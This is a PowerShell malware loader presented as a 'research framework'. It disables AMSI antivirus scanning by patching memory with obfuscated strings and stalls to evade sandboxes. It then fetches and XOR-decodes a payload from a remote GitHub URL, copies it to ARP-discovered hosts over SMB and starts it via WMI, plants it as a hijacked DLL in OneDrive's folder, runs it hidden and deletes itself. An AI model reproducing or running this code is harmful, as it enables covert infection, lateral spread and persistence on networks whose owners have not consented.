# --- [STAGED RESEARCH FRAMEWORK: PROPAGATION + EVASION] ---

function Patch-Mem {
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.A' + 'msi' + 'Utils')
        $b = $a.GetField('am' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed','NonPublic,Static')
        $b.SetValue($null,$true)
        $w = Add-Type -PassThru -Name "w32" -Namespace "w32" -MemberDefinition @'
            [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@
        $h = $w::GetModuleHandle("am" + "si.dll")
        $ptr = $w::GetProcAddress($h, "Am" + "siS" + "canB" + "uffer")
        $old = 0
        $w::VirtualProtect($ptr, [UIntPtr]5, 0x40, [ref]$old)
        [Byte[]]$patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
    } catch { }
}

function Spread-Lateral {
    param($exePath)
    # SMB/WMI Lateral Movement: Scans the local ARP table for active targets
    $targets = arp -a | Select-String -Pattern "\d+\.\d+\.\d+\.\d+" | ForEach-Object { $_.Matches.Value }
    foreach ($ip in $targets) {
        try {
            if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
                $remotePath = "\\$ip\C$\Windows\Temp\WinHostSvc.exe"
                Copy-Item -Path $exePath -Destination $remotePath -ErrorAction SilentlyContinue
                Invoke-CimMethod -ComputerName $ip -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $remotePath }
            }
        } catch { }
    }
}

function Invoke-DLLHijack {
    param($exePath)
    # DLL Hijacking: Targets OneDrive or Teams if present to gain persistence
    $targetApp = "$env:LOCALAPPDATA\Microsoft\OneDrive\OneDrive.exe"
    if (Test-Path $targetApp) {
        $dir = Split-Path $targetApp
        # Copying our payload as a DLL that legitimate apps frequently look for
        Copy-Item -Path $exePath -Destination "$dir\version.dll" -ErrorAction SilentlyContinue
    }
}

# 1. VM FORCING / SANDBOX BYPASS
# VMs usually have low RAM or 1-2 CPUs. We "Force" by waiting for human interaction
# or simply delaying until the VM analysis window (usually 60s) expires.
$mem = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory
if ($mem -lt 4GB) { Start-Sleep -s 120 } 

# 2. Blind AV
Patch-Mem

# 3. Setup Paths
$url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
$key = 0xAB
$workDir = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
$finalExe = "$workDir\WinHostSvc.exe"

if (!(Test-Path $workDir)) { New-Item -Path $workDir -ItemType Directory -Force | Out-Null }

try {
    # 4. Stealth Download
    $tmp = "$env:TEMP\data.tmp"
    Start-BitsTransfer -Source $url -Destination $tmp -Priority High
    
    # 5. XOR Decrypt
    $b64 = Get-Content $tmp -Raw
    $data = [Convert]::FromBase64String($b64.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor $key }
    [IO.File]::WriteAllBytes($finalExe, $data)
    Remove-Item $tmp -Force

    # 6. Propagation & Persistence
    Spread-Lateral -exePath $finalExe
    Invoke-DLLHijack -exePath $finalExe

    # 7. Detached Execution
    $s = New-Object -ComObject "Shell.Application"
    $s.ShellExecute($finalExe, "", "", "open", 0)

    # 8. SELF-DELETE (MELTING)
    # Deletes the calling script and temporary files immediately
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
} catch { }
